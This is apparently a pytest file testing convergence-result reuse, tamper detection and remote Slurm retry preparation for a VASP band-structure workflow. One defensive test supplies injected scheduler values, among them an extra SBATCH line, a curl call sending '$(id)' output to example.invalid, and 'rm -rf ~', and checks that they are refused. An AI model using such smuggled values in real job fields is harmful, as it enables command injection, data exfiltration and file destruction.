import json
import numpy as np
from types import SimpleNamespace as NS

import pytest
from pymatgen.io.vasp.inputs import Poscar

import vasp_agent.workflow.convergence_reuse as reuse
import vasp_agent.workflow.full_workflow as full
import vasp_agent.workflow.stage_gate as gate
import vasp_agent.workflow.vasp_band_agent as core
from test_stage_gate import staged, approve
from test_full_workflow import result


@pytest.fixture
def completed_source(staged, monkeypatch):
    launches = []
    def read(folder):
        return result(Poscar.from_file(folder / 'POSCAR').structure,
                      energy=float((folder / 'vasprun.xml').read_text()))
    def execute(root, name, command):
        folder = root / name
        if not (folder / 'complete.json').exists():
            launches.append(name)
            energy = -10. + (int(name[-1]) * .1 if name.startswith('convergence/mesh') else 0)
            (folder / 'vasprun.xml').write_text(str(energy))
            core.save(folder / 'complete.json', {'xml_sha256': core.digest(folder / 'vasprun.xml')})
        return read(folder)
    monkeypatch.setattr(core, 'execute', execute)
    monkeypatch.setattr(core, 'read_result', read)
    monkeypatch.setattr(full.Potcar, 'from_file', lambda _: [NS(element='Si', functional='PBE', enmax=245., ZVAL=4, TITEL='synthetic')])
    gate.confirm_physics(staged, 'silicon PBE')
    approve(staged)
    with pytest.raises(ValueError, match='mesh 扫描'):
        full.run_full(staged, ['mock'])
    return staged, launches


def test_partial_failure_preserves_pass_and_only_mesh_executes(completed_source, monkeypatch):
    source, launches = completed_source
    report = reuse.inspect(source)['parameters']
    assert report['encut']['status'] == 'passed'
    assert report['mesh']['status'] == 'failed'
    target = source.parent / 'mesh-retry'
    prepared = reuse.prepare_retry(source, target, 'mesh', meshes=[[6]*3, [8]*3, [10]*3])
    assert prepared['preparation_summary']['execution_plan']['compute'] == ['mesh']
    assert not (target / 'convergence/encut-0').exists()
    assert (target / 'reused-evidence/convergence/encut-0/vasprun.xml').exists()
    assert not (target / 'physics-model.json').exists()
    another = source.parent / 'mesh-retry-again'
    reuse.prepare_retry(target, another, 'mesh', meshes=[[10]*3, [12]*3, [14]*3])
    assert reuse.inspect(another)['parameters']['encut']['status'] == 'passed'
    gate.confirm_physics(target, 'silicon PBE')
    approve(target)
    launches.clear()
    def execute(root, name, command):
        launches.append(name)
        folder = root / name
        (folder / 'vasprun.xml').write_text('-10.')
        core.save(folder / 'complete.json', {'xml_sha256': core.digest(folder / 'vasprun.xml')})
        return result(Poscar.from_file(folder / 'POSCAR').structure)
    monkeypatch.setattr(core, 'execute', execute)
    full.run_full(target, ['mock'])
    assert launches == [f'convergence/mesh-{i}' for i in range(3)]
    assert gate.current(target) == 'relaxation'
    assert gate.context(target)['phase'] == 'relaxation'
    saved = json.loads((target / 'convergence.json').read_text(encoding='utf-8'))
    assert saved['encut']['origin'] == 'reused' and saved['mesh']['origin'] == 'computed'
    (target / 'reused-evidence/convergence/encut-0/vasprun.xml').write_text('tampered')
    with pytest.raises(ValueError):
        gate.context(target)


def test_reject_failed_parameter_or_changed_output(completed_source):
    source, _ = completed_source
    with pytest.raises(ValueError, match='未通过'):
        reuse.prepare_retry(source, source.parent / 'bad', 'encut')
    assert not (source.parent / 'bad').exists()
    (source / 'convergence/encut-1/vasprun.xml').write_text('changed')
    assert reuse.inspect(source)['parameters']['encut']['status'] == 'unavailable'
    with pytest.raises(ValueError, match='哈希'):
        reuse.prepare_retry(source, source.parent / 'bad2', 'mesh')


def test_only_encut_and_both_modes(completed_source):
    source, _ = completed_source
    for i in range(3):
        folder = source / f'convergence/mesh-{i}'
        (folder / 'vasprun.xml').write_text('-10.')
        core.save(folder / 'complete.json', {'xml_sha256': core.digest(folder / 'vasprun.xml')})
    target = source.parent / 'encut-retry'
    reuse.prepare_retry(source, target, 'encut', encuts=[676, 780, 900])
    assert (target / 'convergence/encut-0').is_dir()
    assert not (target / 'convergence/mesh-0').exists()
    both = source.parent / 'both-retry'
    reuse.prepare_retry(source, both, 'both')
    assert (both / 'convergence/mesh-0').is_dir() and (both / 'convergence/encut-0').is_dir()
    with pytest.raises(ValueError):
        reuse.prepare_retry(source, both, 'both')


@pytest.mark.parametrize('fixed', [None, 598, 'old_release'])
def test_remote_retry_entry_and_resources(completed_source, monkeypatch, fixed):
    import shutil
    from pathlib import Path
    import vasp_agent.remote.remote_worker as worker
    source, _ = completed_source
    remote = source.parents[1] / 'remote'
    jobs = remote / 'jobs'
    jobs.mkdir(parents=True)
    shutil.copytree(source, jobs / 'source')
    core.save(remote / 'deployment.json', {'release': str(Path(core.__file__).parent)})
    env = remote / 'env.sh'
    env.write_text('# test')
    cfg = dict(root=str(remote), python='python', vasp_env=str(env), partition='compute', walltime='04:00:00')
    def run(args, **kwargs):
        assert args[:2] == ['bash', '-n']
        return NS(returncode=0)
    environment = {'executable_sha256': 'fixture', 'environment_sha256': 'fixture', 'executable': '/fake/vasp_std'}
    monkeypatch.setattr(worker, 'inspect_environment', lambda *a: environment)
    core.save(jobs / 'source/environment-review.json', environment)
    monkeypatch.setattr(worker.subprocess, 'run', run)
    if fixed == 'old_release':
        monkeypatch.setattr(reuse, 'FIXED_ENCUT_VERSION', 0)
        with pytest.raises(ValueError, match='部署新版'):
            worker.dispatch(dict(config=cfg, action='prepare_scan_retry', job_name='retry', source_job='source',
                mode='mesh', encuts=None, meshes=[[10]*3, [12]*3, [14]*3], fixed_encut=598))
        assert not (jobs / 'retry').exists()
        return
    result = worker.dispatch(dict(config=cfg, action='prepare_scan_retry', job_name='retry', source_job='source',
                                  mode='mesh', encuts=None, meshes=[[6]*3, [8]*3, [10]*3], fixed_encut=fixed))
    assert result['prepared']
    resource = worker.resource_context(jobs / 'retry', 'convergence')
    assert resource['execution_plan']['tests'] == (4 if fixed is not None else 3)
    assert resource['execution_plan']['reuse'] == ['encut']
    assert (jobs / 'retry/remote-job.json').exists()
    assert not (jobs / 'retry/remote-submission.json').exists()


# The convergence-reuse path builds its own batch script and once skipped the
# partition/walltime check its sibling performs, so an injected newline reached
# submit.slurm here. Both branches are now covered; this is the one that was
# missing, and the empty call list asserts the refusal happens before the job
# directory is built rather than after.
@pytest.mark.parametrize('field,value,message', [
    ('partition', 'compute\n#SBATCH --gpus=8\ncurl -s http://example.invalid/$(id)', '分区'),
    ('partition', 'compute; rm -rf ~', '分区'),
    ('walltime', '04:00:00\n#SBATCH --gpus=8', '运行时间'),
    ('walltime', 'four hours', '运行时间')])
def test_remote_retry_rejects_injected_scheduler_fields(completed_source, monkeypatch, field, value, message):
    import shutil
    from pathlib import Path
    import vasp_agent.remote.remote_worker as worker
    source, _ = completed_source
    remote = source.parents[1] / 'remote'
    jobs = remote / 'jobs'
    jobs.mkdir(parents=True)
    shutil.copytree(source, jobs / 'source')
    core.save(remote / 'deployment.json', {'release': str(Path(core.__file__).parent)})
    env = remote / 'env.sh'
    env.write_text('# test')
    cfg = dict(root=str(remote), python='python', vasp_env=str(env), partition='compute', walltime='04:00:00')
    cfg[field] = value
    calls = []
    monkeypatch.setattr(worker.subprocess, 'run', lambda args, **kw: calls.append(args) or NS(returncode=0))
    environment = {'executable_sha256': 'fixture', 'environment_sha256': 'fixture', 'executable': '/fake/vasp_std'}
    monkeypatch.setattr(worker, 'inspect_environment', lambda *a: environment)
    core.save(jobs / 'source/environment-review.json', environment)
    with pytest.raises(ValueError, match=message):
        worker.dispatch(dict(config=cfg, action='prepare_scan_retry', job_name='retry', source_job='source',
                             mode='mesh', encuts=None, meshes=[[6]*3, [8]*3, [10]*3], fixed_encut=None))
    assert calls == []
    assert not (jobs / 'retry').exists()


@pytest.mark.parametrize('failure', [None, 'energy', 'force', 'stress'])
def test_explicit_598_mesh_retry_requires_cross_check(completed_source, monkeypatch, failure):
    from pymatgen.io.vasp.inputs import Incar, Kpoints
    source, _ = completed_source
    before = {str(p.relative_to(source)): p.read_bytes() for p in source.rglob('*') if p.is_file()}
    target = source.parent / 'fixed-598'
    reuse.prepare_retry(source, target, 'mesh', meshes=[[10]*3, [12]*3, [14]*3], fixed_encut=598)
    for i in range(3):
        assert Incar.from_file(target / f'convergence/mesh-{i}/INCAR')['ENCUT'] == 598
    assert Incar.from_file(target / 'convergence/cross-cutoff/INCAR')['ENCUT'] == 676
    assert list(Kpoints.from_file(target / 'convergence/cross-cutoff/KPOINTS').kpts[0]) == [14]*3
    plan = json.loads((target / 'input-plan.json').read_text(encoding='utf-8'))
    assert plan['incars']['relax-1']['ENCUT'] == 598 and plan['incars']['scf']['ENCUT'] == 598
    assert plan['incars']['validation/higher-cutoff']['ENCUT'] > 676
    assert plan['execution_plan']['tests'] == 4
    gate.confirm_physics(target, 'silicon PBE')
    approve(target)
    launches = []
    def execute(root, name, command):
        launches.append(name)
        folder = root / name
        kwargs = {}
        if name.endswith('cross-cutoff') and failure:
            kwargs = {'energy': -9} if failure == 'energy' else {failure: 2.0}
        data = result(Poscar.from_file(folder / 'POSCAR').structure, **kwargs)
        (folder / 'vasprun.xml').write_text('-10.')
        core.save(folder / 'complete.json', {'xml_sha256': core.digest(folder / 'vasprun.xml')})
        return data
    monkeypatch.setattr(core, 'execute', execute)
    if failure:
        with pytest.raises(ValueError, match='交叉精度复核失败'):
            full.run_full(target, ['mock'])
        assert gate.current(target) == 'convergence'
    else:
        full.run_full(target, ['mock'])
        assert gate.current(target) == 'relaxation'
        assert gate.context(target)['phase'] == 'relaxation'
    assert len(launches) == 4 and all(x.startswith('convergence/') for x in launches)
    saved = json.loads((target / 'convergence.json').read_text(encoding='utf-8'))
    assert saved['cross_cutoff']['status'] == ('failed' if failure else 'passed')
    assert before == {str(p.relative_to(source)): p.read_bytes() for p in source.rglob('*') if p.is_file()}


@pytest.mark.parametrize('fixed,mode', [(599, 'mesh'), (676, 'mesh'), (float('nan'), 'mesh'), (598, 'both'), (True, 'mesh')])
def test_invalid_fixed_cutoff_never_creates_target(completed_source, fixed, mode):
    source, _ = completed_source
    target = source.parent / 'bad-fixed'
    with pytest.raises(ValueError):
        reuse.prepare_retry(source, target, mode, fixed_encut=fixed)
    assert not target.exists()


def test_fixed_cross_input_tampering_rejected(completed_source):
    from vasp_agent.workflow.scan_config import verify_scan_inputs
    source, _ = completed_source
    target = source.parent / 'fixed-tamper'
    reuse.prepare_retry(source, target, 'mesh', fixed_encut=598)
    path = target / 'convergence/cross-cutoff/INCAR'
    path.write_text('ENCUT=598')
    with pytest.raises(ValueError, match='交叉复核'):
        verify_scan_inputs(target)


def test_reuse_receipt_lists_what_was_and_was_not_compared(completed_source):
    source, _ = completed_source
    target = source.parent / 'mesh-receipt'
    reuse.prepare_retry(source, target, 'mesh', meshes=[[6]*3, [8]*3, [10]*3])
    receipt = json.loads((target / 'convergence-reuse.json').read_text(encoding='utf-8'))
    assert receipt['checked']['parameters'] == list(reuse.REUSE_CHECKED)
    assert set(receipt['unchecked_parameters']) == {'symprec', 'points', 'nsw'}
    assert not any(item['differs'] for item in receipt['unchecked_parameters'].values())


def _set_energy(folder, energy):
    (folder / 'vasprun.xml').write_text(str(energy))
    core.save(folder / 'complete.json', {'xml_sha256': core.digest(folder / 'vasprun.xml')})


def test_fixed_cutoff_that_source_data_already_fails_is_refused_upfront(completed_source):
    source, _ = completed_source
    # Adjacent steps 0.8 and 0.7 meV/atom pass; the ends differ by 1.5 meV/atom.
    for index, energy in enumerate((-10.0, -10.0008, -10.0015)):
        _set_energy(source / f'convergence/encut-{index}', energy)
    report = reuse.inspect(source)['parameters']['encut']
    assert report['status'] == 'passed'
    rows = {row['encut']: row for row in report['cutoff_vs_highest']}
    assert not rows[520]['passed'] and rows[520]['energy_diff_meV_per_atom'] == 1.5 and rows[598]['passed']
    target = source.parent / 'doomed'
    with pytest.raises(ValueError, match='交叉复核必然失败') as refused:
        reuse.prepare_retry(source, target, 'mesh', meshes=[[6]*3, [8]*3, [10]*3], fixed_encut=520)
    assert '598' in str(refused.value) and not target.exists()
    reuse.prepare_retry(source, source.parent / 'fine', 'mesh', meshes=[[6]*3, [8]*3, [10]*3], fixed_encut=598)


def test_operator_scan_thresholds_rejudge_reused_evidence(completed_source, monkeypatch):
    source, _ = completed_source
    stresses = {'encut-0': 0.0, 'encut-1': 1.5, 'encut-2': 3.0}  # 1.5 kbar steps: fail 0.5, pass 2.0
    original = core.read_result
    def read(folder):
        data = original(folder)
        stress = stresses.get(folder.name, 0.0)
        for step in data.ionic_steps:
            step['stress'] = (np.eye(3) * stress).tolist()
        return data
    monkeypatch.setattr(core, 'read_result', read)
    config = json.loads((source / 'config.json').read_text())
    assert config['relax_mode'] == 'cell'
    with pytest.raises(ValueError, match='不能复用'):
        reuse.prepare_retry(source, source.parent / 'strict', 'mesh', meshes=[[6]*3, [8]*3, [10]*3])
    target = source.parent / 'relaxed'
    reuse.prepare_retry(source, target, 'mesh', meshes=[[6]*3, [8]*3, [10]*3], scan_thresholds={'stress_kbar': 2.0})
    saved = json.loads((target / 'config.json').read_text())
    assert saved['scan_thresholds'] == {'stress_kbar': 2.0} and saved['stress_tol'] == config['stress_tol']
    receipt = json.loads((target / 'convergence-reuse.json').read_text(encoding='utf-8'))
    assert receipt['rejudged_with_operator_thresholds'] and receipt['judged_with_thresholds']['stress_kbar'] == 2.0
    assert receipt['result']['comparisons'][0]['comparison_policy'] == 'operator_scan_thresholds_v1'


def test_scan_threshold_validation_and_sources():
    from vasp_agent.workflow.full_workflow import compare, validate_scan_thresholds
    from test_full_workflow import config as base_config, result
    for bad in ({'stress_kbar': 50}, {'pressure': 1}, {'force_eV_per_A': -1}):
        with pytest.raises(ValueError):
            validate_scan_thresholds(bad)
    cfg = {**base_config(), 'scan_thresholds': {'stress_kbar': 2.0}}
    check = compare(full.metrics(result(stress=0.)), full.metrics(result(stress=1.5)), cfg)
    assert check['passed'] and check['threshold_sources'] == {'energy_eV_per_atom': 'default',
        'force_eV_per_A': 'default', 'stress_kbar': 'operator'}
    assert not compare(full.metrics(result(stress=0.)), full.metrics(result(stress=1.5)), base_config())['passed']


def test_retry_with_standard_preset_rejudges_and_records_it(completed_source, monkeypatch):
    source, _ = completed_source
    stresses = {'encut-0': 0.0, 'encut-1': 1.5, 'encut-2': 3.0}
    original = core.read_result
    def read(folder):
        data = original(folder)
        for step in data.ionic_steps:
            step['stress'] = (np.eye(3) * stresses.get(folder.name, 0.0)).tolist()
        return data
    monkeypatch.setattr(core, 'read_result', read)
    with pytest.raises(ValueError, match='不能复用'):
        reuse.prepare_retry(source, source.parent / 'strict', 'mesh', meshes=[[6]*3, [8]*3, [10]*3])
    target = source.parent / 'standard'
    reuse.prepare_retry(source, target, 'mesh', meshes=[[6]*3, [8]*3, [10]*3], scan_preset='standard')
    saved = json.loads((target / 'config.json').read_text())
    assert saved['scan_preset'] == 'standard' and 'scan_thresholds' not in saved
    receipt = json.loads((target / 'convergence-reuse.json').read_text(encoding='utf-8'))
    assert receipt['judged_with_thresholds']['stress_kbar'] == 2.0 and receipt['rejudged_with_operator_thresholds']
